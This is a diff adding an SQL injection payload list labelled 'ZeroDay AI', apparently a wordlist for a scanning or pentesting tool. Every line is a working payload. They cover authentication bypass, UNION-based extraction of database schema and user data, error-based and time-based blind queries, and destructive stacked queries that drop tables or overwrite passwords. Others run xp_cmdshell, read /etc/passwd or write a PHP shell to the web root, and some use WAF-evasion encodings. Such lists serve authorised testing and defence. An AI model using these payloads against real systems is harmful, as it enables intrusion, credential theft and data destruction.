@@ -1,0 +1,82 @@
+# SQL Injection Payloads — ZeroDay AI
+# ─────────────────────────────────────
+
+# Classic authentication bypass
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+" OR "1"="1
+" OR "1"="1"--
+admin'--
+admin' #
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+1' OR '1'='1
+' OR 20=20--
+" OR 20=20--
+' OR 'a'='a'--
+' OR 1=1 LIMIT 1--
+') OR ('1'='1
+')) OR (('1'='1
+
+# UNION-based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT NULL--
+1 UNION SELECT user(),version(),database()--
+1 UNION SELECT @@version,NULL,NULL--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+
+# Error-based (MySQL)
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND updatexml(1,concat(0x7e,(SELECT database())),1)--
+
+# Error-based (MSSQL)
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+'; EXEC xp_cmdshell('whoami')--
+
+# Blind Boolean
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+1 AND 1=1
+1 AND 1=2
+' AND SUBSTRING(username,1,1)='a
+' AND ASCII(SUBSTRING(username,1,1))>64--
+
+# Time-based Blind (MySQL)
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+1; WAITFOR DELAY '0:0:5'--
+1'; SELECT SLEEP(5)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+'; SELECT pg_sleep(5)--
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+' AND 1=(SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1
+' AND 1=1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+' AND 1=(SELECT 1 FROM (SELECT(SLEEP(5)))a) UNION SELECT 1,2,3--
+
+# Stacked queries
+'; DROP TABLE users--
+'; INSERT INTO users VALUES('hacked','hacked')--
+'; UPDATE users SET password='hacked' WHERE '1'='1
+
+# Out-of-band
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' INTO OUTFILE '/var/www/html/shell.php'--
+
+# WAF bypass variants
+'/**/OR/**/'1'='1
+'%09OR%091=1--
+' /*!UNION*/ /*!SELECT*/ NULL--
+%27 OR 1=1--
+0x27 OR 1=1--
+' oR '1'='1
